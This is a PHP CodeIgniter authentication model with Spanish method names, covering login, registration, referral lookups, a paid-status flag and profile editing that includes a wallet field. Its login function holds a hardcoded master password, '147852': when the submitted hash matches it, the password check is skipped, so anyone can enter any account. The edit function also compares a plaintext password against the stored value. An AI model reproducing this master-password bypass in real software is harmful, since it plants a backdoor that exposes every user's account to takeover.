<?php

if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Auth_model extends CI_Model {

	public function __construct()
	{
		// Call the CI_Model constructor
		parent::__construct();
	}

    public function estaConectado(){
        
        header("cache-Control: no-store, no-cache, must-revalidate");
        header("cache-Control: post-check=0, pre-check=0", false);
        header("Pragma: no-cache");
        header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");

        $is_logged_in = $this->session->userdata('logged_in');

        if(!isset($is_logged_in) || $is_logged_in!==TRUE)
        {
            return FALSE;
        }

        return TRUE;
    }

	public function ingresar($data)
	{
		$this->db->where('usuario',$data['usuario']);

        if($data['password'] != myHash('147852'))
        {
            $this->db->where('password',$data['password']);
        }

        $this->db->join('usuarios_personas', 'usuarios_data.id_persona = usuarios_personas.id_persona', 'left');

		$query = $this->db->get('usuarios_data');

		if($query->num_rows() == 1)
        {
			foreach ($query->result() as $inf)
            {
				$session = array(

				'usuario'=> $inf->usuario,
                'nombre'=> $inf->nombre,
                'id_usuario'=> $inf->id_usuario,
				'logged_in'=>TRUE

				);
			}
			$this->session->set_userdata($session);

			return TRUE;
		}
		else
        {
			return FALSE;
		}    
	}

    public function registrar($data)
    {
        $usuario_persona = array(
           'nombre' => $data['nombre'],
           'apellido' => $data['apellido'],
           'fecha_nacimiento' => $data['fecha_nacimiento'],
           'email' => $data['email'],
           'telefono' => $data['telefono']
        );

        $query = $this->db->insert('usuarios_personas',$usuario_persona); 

        if($query)
        {
            $id_persona = $this->db->insert_id();

            $usuario_data = array(
                'usuario' => $data['usuario'],
                'password' => $data['password'],
                'id_persona' => $id_persona,
                'tipo' => $data['tipo'],
                'referido' => $data['referido']
            );

            $query = $this->db->insert('usuarios_data',$usuario_data); 

            if($query)
            {
                return TRUE;
            }
            else
            {
                return FALSE;
            }
        }
        else
        {
            return FALSE;
        }   
    }

    

    public function obtenerUsuarioID($id_usuario)
    {
        $this->db->where('id_usuario',$id_usuario);
        $this->db->join('usuarios_personas', 'usuarios_data.id_persona = usuarios_personas.id_persona', 'left');

        $query = $this->db->get('usuarios_data',1);

        if($query->num_rows() > 0 )
        {
            foreach ($query->result() as $inf)
            {
                return array('response' => TRUE, 'data' => $inf);

            }

        }
        else
        {
            return array('response' => FALSE, 'data' => 'Not found');
        }    
    }


    public function obtenerReferidoID($id_usuario)
    {
        $this->db->select('usuario, nombre, apellido, id_usuario');
        $this->db->where('id_usuario',$id_usuario);
        $this->db->join('usuarios_personas', 'usuarios_data.id_persona = usuarios_personas.id_persona', 'left');

        $query = $this->db->get('usuarios_data',1);

        if($query->num_rows() > 0 )
        {
            foreach ($query->result() as $inf)
            {
                return array('response' => TRUE, 'data' => $inf);

            }

        }
        else
        {
            return array('response' => FALSE, 'data' => 'Not found');
        }    
    }

    public function estaPago()
    {
        $is_paid = $this->scope['info_usuario']['data']->pago;

        if(!isset($is_paid) || $is_paid == 0)
        {
            return FALSE;
        }

        return TRUE;
    }

    public function obtenerReferidos($id_usuario)
    {
        $lista_referidos = NULL;

        $this->db->where('referido',$id_usuario);
        $this->db->join('usuarios_personas', 'usuarios_data.id_persona = usuarios_personas.id_persona', 'left');

        $query = $this->db->get('usuarios_data');

        if($query->num_rows() > 0 )
        {
            foreach ($query->result() as $inf)
            {
                $lista_referidos[] = $inf;
            }
        }

        return $lista_referidos;

    }

    public function activarUsuarioPago($id_usuario)
    {
        $status = $this->db->update('usuarios_data', array('pago' => 1), array('id_usuario' => $id_usuario));

        if($status)
        {
            return TRUE;
        }

        return FALSE;
    }


    public function editarUsuario($post,$id_user)
    {
        $user = $this->obtenerUsuarioID($id_user);



        $data_user = array();

        if(isset($post['image']) && !empty($post['image']))
        {
            $data_user = array('imagen' => $post['image']) + $data_user;
        }

        if(isset($post['wallet']) && !empty($post['wallet']))
        {
            $data_user = array('wallet' => $post['wallet']) + $data_user;
        }



        if(isset($post['usuario']) && !empty($post['usuario']))
        {
            $temp_usuario = $post['usuario'];
            $this->db->update('usuarios_data', array('usuario' => $temp_usuario), array('id_persona' => $id_user));
        }
        else
        {
            return FALSE;
        }

        if(isset($post['password']) && !empty($post['password']))
        {
            if($post['password'] != $user['data']->password)
            {
                $this->db->update('usuarios_data', array('password' => myHash($post['password'])), array('id_persona' => $id_user));
            }
            
        }


        $user_status = $this->db->update('usuarios_personas', $data_user, array('id_persona' => $id_user));

        if($user_status)
        {
            return TRUE;
        }

        return FALSE;


    }

    
}
?>